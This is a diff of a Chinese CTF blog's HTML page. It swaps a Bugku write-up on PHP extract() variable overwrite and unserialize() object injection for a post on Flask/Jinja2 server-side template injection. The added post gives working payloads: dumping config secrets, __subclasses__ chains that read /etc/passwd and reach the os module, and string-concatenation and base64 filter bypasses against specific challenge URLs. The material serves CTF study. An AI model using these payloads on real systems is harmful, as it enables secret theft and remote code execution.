@@ -81,18 +81,21 @@
 
 
 
-<meta name="description" content="Web8/welcome to bugkuctfphp变量覆盖漏洞&amp;lt;?phpextract($_GET);if (!empty($ac)){$f = trim(file_get_contents($fn));if ($ac === $f){echo “This is flag:” .” $flag”;}else{echo”sorry!”;}}?&amp;gt;">
+<meta name="description" content="前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替 SSTI服务器模板注入什么是SSTI？ SSTI全称Server-Side-Template-Injection，即服务端模版注入攻击。 攻击成因是服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射(ORM)。">
 <meta name="keywords" content="WP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Bugku(2)">
-<meta property="og:url" content="http://yoursite.com/2018/12/26/Bugku-2/index.html">
+<meta property="og:title" content="SSTI(1)">
+<meta property="og:url" content="http://yoursite.com/2019/04/07/SSTI-1/index.html">
 <meta property="og:site_name" content="木偶&#39;s blog">
-<meta property="og:description" content="Web8/welcome to bugkuctfphp变量覆盖漏洞&amp;lt;?phpextract($_GET);if (!empty($ac)){$f = trim(file_get_contents($fn));if ($ac === $f){echo “This is flag:” .” $flag”;}else{echo”sorry!”;}}?&amp;gt;">
+<meta property="og:description" content="前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替 SSTI服务器模板注入什么是SSTI？ SSTI全称Server-Side-Template-Injection，即服务端模版注入攻击。 攻击成因是服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射(ORM)。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-02-14T03:46:25.533Z">
+<meta property="og:image" content="https://img-blog.csdn.net/20181004223429919?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20181004224339752?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:updated_time" content="2019-04-07T14:15:07.150Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Bugku(2)">
-<meta name="twitter:description" content="Web8/welcome to bugkuctfphp变量覆盖漏洞&amp;lt;?phpextract($_GET);if (!empty($ac)){$f = trim(file_get_contents($fn));if ($ac === $f){echo “This is flag:” .” $flag”;}else{echo”sorry!”;}}?&amp;gt;">
+<meta name="twitter:title" content="SSTI(1)">
+<meta name="twitter:description" content="前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替 SSTI服务器模板注入什么是SSTI？ SSTI全称Server-Side-Template-Injection，即服务端模版注入攻击。 攻击成因是服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射(ORM)。">
+<meta name="twitter:image" content="https://img-blog.csdn.net/20181004223429919?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
 
 
 
@@ -122,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/26/Bugku-2/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/07/SSTI-1/">
 
 
 
 
 
-  <title>Bugku(2) | 木偶's blog</title>
+  <title>SSTI(1) | 木偶's blog</title>
   
 
 
@@ -298,7 +301,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/26/Bugku-2/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/07/SSTI-1/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="木偶">
@@ -315,7 +318,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Bugku(2)</h1>
+          <h1 class="post-title" itemprop="name headline">SSTI(1)</h1>
         
 
         <div class="post-meta">
@@ -327,8 +330,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-26T23:02:56+08:00">
-                2018-12-26
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-07T09:52:33+08:00">
+                2019-04-07
               </time>
             
 
@@ -368,8 +371,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/12/26/Bugku-2/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/12/26/Bugku-2/" itemprop="commentCount"></span>
+                <a href="/2019/04/07/SSTI-1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/07/SSTI-1/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -391,7 +394,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  698 字
+                  1.1k 字
                 </span>
               
 
@@ -407,7 +410,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  4 分钟
                 </span>
               
             </div>
@@ -428,34 +431,42 @@
       
 
       
-        <h2 id="Web8-welcome-to-bugkuctf"><a href="#Web8-welcome-to-bugkuctf" class="headerlink" title="Web8/welcome to bugkuctf"></a>Web8/welcome to bugkuctf</h2><h2 id="php变量覆盖漏洞"><a href="#php变量覆盖漏洞" class="headerlink" title="php变量覆盖漏洞"></a>php变量覆盖漏洞</h2><p>&lt;?php<br>extract($_GET);<br>if (!empty($ac))<br>{<br>$f = trim(file_get_contents($fn));<br>if ($ac === $f)<br>{<br>echo “This is flag:” .” $flag”;<br>}<br>else<br>{<br>echo”sorry!”;<br>}<br>}<br>?&gt;<br><a id="more"></a></p>
-<h3 id="先说一下php函数"><a href="#先说一下php函数" class="headerlink" title="先说一下php函数"></a>先说一下php函数</h3><h4 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract() 函数"></a>extract() 函数</h4><p>从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。<br>该函数返回成功导入到符号表中的变量数目。</p>
-<h4 id="trim-string-charlist"><a href="#trim-string-charlist" class="headerlink" title="trim(string,charlist)"></a>trim(string,charlist)</h4><p>string    必需。规定要检查的字符串。<br>charlist<br>可选。<br>规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：<br>“\0” - NULL<br>“\t” - 制表符<br>“\n” - 换行<br>“\x0B” - 垂直制表符<br>“\r” - 回车<br>“ “ - 空格</p>
-<h4 id="empty-和isset"><a href="#empty-和isset" class="headerlink" title="empty()和isset()"></a>empty()和isset()</h4><p>PHP的isset()函数 一般用来检测变量是否设置 </p>
-<p>若变量不存在则返回 FALSE<br>若变量存在且其值为NULL，也返回 FALSE<br>若变量存在且值不为NULL，则返回 TURE </p>
-<p>PHP的empty()函数 判断值为否为空 </p>
-<p>若变量不存在则返回 TRUE<br>若变量存在且其值为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 TURE<br>若变量存在且值不为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 FALSE   </p>
-<p>php封装协议php://input写入fn的值与a相同即可</p>
-<h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>welcome to the bugkuctf中利用php封装协议读取index.php和hint.php的内容得到全部的源码，可知flag在flag.php里，但是需要绕过一步正则匹配的限制。</p>
-<h5 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h5><p>&lt;?php  </p>
-<p>class Flag{//flag.php<br>    public $file;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “<br>“;<br>        return (“good”);<br>        }<br>    }<br>}<br>?&gt;  </p>
-<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><p>&lt;?php<br>$txt = $_GET[“txt”];<br>$file = $_GET[“file”];<br>$password = $_GET[“password”];  </p>
-<p>if(isset($txt)&amp;&amp;(file_get_contents($txt,’r’)===”welcome to the bugkuctf”)){<br>    echo “hello friend!<br>“;<br>    if(preg_match(“/flag/“,$file)){<br>        echo “不能现在就给你flag”;<br>        exit();<br>    }else{<br>        include($file);<br>        $password = unserialize($password);<br>        echo $password;<br>    }<br>}else{<br>    echo “you are not the number of bugku ! “;<br>}  </p>
-<p>?&gt;  </p>
-<!--  
-$user = $_GET["txt"];  
-$file = $_GET["file"];  
-$pass = $_GET["password"];  
+        <p>前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。<br>hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替</p>
+<h2 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h2><p>什么是SSTI？</p>
+<p>SSTI全称Server-Side-Template-Injection，即服务端模版注入攻击。</p>
+<p>攻击成因是服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射(ORM)。</p>
+<p>这样，攻击者可以控制渲染进模版的内容。通过直接输入模版渲染的关键词例如{ }，即可将恶意代码注入模版中执行。最严重的后果是getshell。</p>
+<p>现在有很多常见的模版渲染引擎，而最常用也最长出问题的Web框架就是基于Python的Flask框架了。</p>
+<h2 id="注入姿势："><a href="#注入姿势：" class="headerlink" title="注入姿势："></a>注入姿势：</h2><h3 id="内省config对象"><a href="#内省config对象" class="headerlink" title="内省config对象"></a>内省config对象</h3><p>config对象是一个Flask模板全局变量，代表“当前配置对象(flask.config）”。它是一个类似于字典的对象，其中包含了应用程序所有的配置值，包含若干独特方法的子类：from_envvar，from_object，from_pyfile，以及root_path。在大多数情况下，会包含数据库连接字符串，第三方服务凭据，SECRET_KEY之类的敏感信息。</p>
+<p>对于新加载的模块，from_object方法会将那些变量名全是大写的属性添加到config对象中。注入payload{ config.items() }就可以轻松查看这些配置了。　　</p>
+<h3 id="使用非常重要的内省组件：-mro-和-subclasses-属性。"><a href="#使用非常重要的内省组件：-mro-和-subclasses-属性。" class="headerlink" title="使用非常重要的内省组件：__mro__和__subclasses__属性。"></a>使用非常重要的内省组件：__mro__和__subclasses__属性。</h3><p>__mro__中的MRO代表方法解析顺序，并且在这里定义为，“是一个包含类的元组，而其中的类就是在方法解析的过程中在寻找父类时需要考虑的类”。__mro__属性以包含类的元组来显示对象的继承关系，它的父类，父类的父类，一直向上到object（如果是使用新式类的话）。它是每个对象的元类属性，但它却是一个隐藏属性，因为Python在进行内省时明确地将它从dir的输出中移除了（见Objects/object.c的第1812行）。</p>
+<p>__subclasses__属性则在这里被定义为一个方法，“每个新式类保留对其直接子类的一个弱引用列表。此方法返回那些引用还存在的子类”。</p>
+<p>使用__mro__属性来访问对象的父类，使用__subclasses__属性来访问对象的子类</p>
+<p>使用索引2来选择object类。现在我们到达了object类，我们使用/<strong>subclasses</strong>属性来dump应用程序中使用的所有类（找到file类的索引）<br>找到object:<br>    { ‘’.__class__.__mro__[2].__subclasses__() }</p>
+<p>任意文件读取：<br>    { ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }</p>
+<h4 id="os-模块"><a href="#os-模块" class="headerlink" title="[os]模块"></a>[os]模块</h4><p>通过os模块可以进行一些文件的操作</p>
+<pre><code>{[].\__class__.\__base__.\__subclasses__()}
+</code></pre><p>的方法来访问所有模块<br><img src="https://img-blog.csdn.net/20181004223429919?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br>访问os模块都是从warnings.catch_warnings模块入手的。找到catch_warnings的位置(上面查到的所有模块的索引，这里是59，即第59个模块)；</p>
+<p>知道了位置后，再用func_globals看看该模块有哪些global函数;</p>
+<p>在url后面输入<br>    {[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}<br><img src="https://img-blog.csdn.net/20181004224339752?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br>这里能看到linecache，我们要访问的os模块就在这里，现在我们看看这个模块的各种属性：</p>
+<p>在url后面输入<br>    {[].__class__.__base__.__subclasses__()[59].__init__.func_globals[‘linecache’].__dict__}<br>然后在很长的返回值里就可以找到os模块了<br>然后就可以用</p>
+<pre><code>{[].\__class__.\__base__.\__subclasses__()[59].\__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;]}
+</code></pre><p>来代替os模块的使用了，之所以写__dict__[‘o’+’s’]，而不写__dict__[‘os’],是因为os这个字符串被禁用了，只能使用python里面字符串的拼接绕过现在os.read()</p>
+<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].read()
 
-if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
-    echo "hello admin!<br>";  
-    include($file); //hint.php  
-}else{  
-    echo "you are not admin ! ";  
-}  
- -->  
-<p>源码中可以看到如果没有匹配到flag的话就会引用file的文件，所以file=hint.php，password的值进行序列化构造，当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 <strong>sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 </strong>wakeup() 成员函数。<br>unserialize()函数变量可控所以就可以构造payload使得hint.php的全局变量file为flag.php<br>password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}最终构造的payload为?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} </p>
+[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].open()
 
+
+[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;.&apos;)
+</code></pre><p>cg题的payload</p>
+<pre><code>http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;..&apos;)%7D%7D 
+看到flag文件
+文件读取打开
+
+http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[40](&apos;/Th1s_th3_fl1l1l11llll1g&apos;).read()%7D%7D 
+</code></pre><p>过滤了class怎么办，base64编码绕过，招新赛的payload</p>
+<pre><code>http://132.232.92.163:6733/?name={[].__getattribute__(&apos;X19jbGFzc19f%27.decode(%27base64&apos;)).__base__.__getattribute__([].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__,&apos;X19zdWJjbGFzc2VzX18=&apos;.decode(&apos;base64&apos;))()[58].__init__.func_globals[&apos;linecache&apos;].__dict__.os.listdir(&quot;/home/blacsheep/&quot;)} 
+</code></pre>
       
     </div>
     
@@ -485,8 +496,8 @@ if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/21/Bugku/" rel="next" title="Bugku">
-                <i class="fa fa-chevron-left"></i> Bugku
+              <a href="/2019/02/14/hgame-php/" rel="next" title="hgame(php)">
+                <i class="fa fa-chevron-left"></i> hgame(php)
               </a>
             
           </div>
@@ -495,8 +506,8 @@ if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/01/27/SQL注入/" rel="prev" title="SQL攻击">
-                SQL攻击 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/04/07/flask伪造session/" rel="prev" title="flask伪造session">
+                flask伪造session <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -713,7 +724,7 @@ if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web8-welcome-to-bugkuctf"><span class="nav-number">1.</span> <span class="nav-text">Web8/welcome to bugkuctf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php变量覆盖漏洞"><span class="nav-number">2.</span> <span class="nav-text">php变量覆盖漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#先说一下php函数"><span class="nav-number">2.1.</span> <span class="nav-text">先说一下php函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#extract-函数"><span class="nav-number">2.1.1.</span> <span class="nav-text">extract() 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#trim-string-charlist"><span class="nav-number">2.1.2.</span> <span class="nav-text">trim(string,charlist)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#empty-和isset"><span class="nav-number">2.1.3.</span> <span class="nav-text">empty()和isset()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php反序列化"><span class="nav-number">2.2.</span> <span class="nav-text">php反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#hint-php"><span class="nav-number">2.2.0.1.</span> <span class="nav-text">hint.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#index-php"><span class="nav-number">2.2.0.2.</span> <span class="nav-text">index.php</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTI服务器模板注入"><span class="nav-number">1.</span> <span class="nav-text">SSTI服务器模板注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入姿势："><span class="nav-number">2.</span> <span class="nav-text">注入姿势：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内省config对象"><span class="nav-number">2.1.</span> <span class="nav-text">内省config对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用非常重要的内省组件：-mro-和-subclasses-属性。"><span class="nav-number">2.2.</span> <span class="nav-text">使用非常重要的内省组件：__mro__和__subclasses__属性。</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#os-模块"><span class="nav-number">2.2.1.</span> <span class="nav-text">[os]模块</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
